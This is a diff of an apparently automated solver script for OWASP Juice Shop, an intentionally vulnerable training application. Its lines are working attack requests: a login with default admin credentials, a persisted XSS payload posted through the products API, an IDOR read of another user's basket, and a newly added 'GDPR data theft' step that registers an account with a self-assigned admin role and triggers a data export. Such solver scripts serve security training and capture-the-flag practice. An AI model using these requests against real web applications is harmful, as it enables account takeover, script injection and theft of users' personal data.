@@ -97,5 +97,8 @@ requests.post(url+'/api/Feedbacks', data={'UserId':1,'captchaId':captcha['captch
 login=loads(requests.post(url+'/rest/user/login', data={'email':'admin@juice-sh.op','password':'admin123'}).text)['authentication']
 # ---- API-only XSS (Perform a persisted XSS attack with <iframe src="javascript:alert(`xss`)"> without using the frontend application at all.)
 requests.post(url+'/api/Products', data={'name':'XSS','description':'<iframe src="javascript:alert(`xss`)">','price':47.11}, headers={'Authorization':'Bearer '+login['token']})
+# ---- GDPR Data Theft (Steal someone else's personal data without using Injection.)
+requests.post(url+'/api/Users',data={'email':'edmin@juice-sh.op','password':'edmin123','role':'admin'})
+requests.post(url+'/rest/user/data-export',data={'format':'1'},headers={'Authorization':'Bearer '+(loads(requests.post(url+'/rest/user/login',data={'email':'edmin@juice-sh.op','password':'edmin123'}).text)['authentication']['token'])})
 # ---- View Basket (View another user's shopping basket.)
 requests.get(url+'/rest/basket/'+str(login['bid']+1), headers={'Authorization':'Bearer '+login['token']})
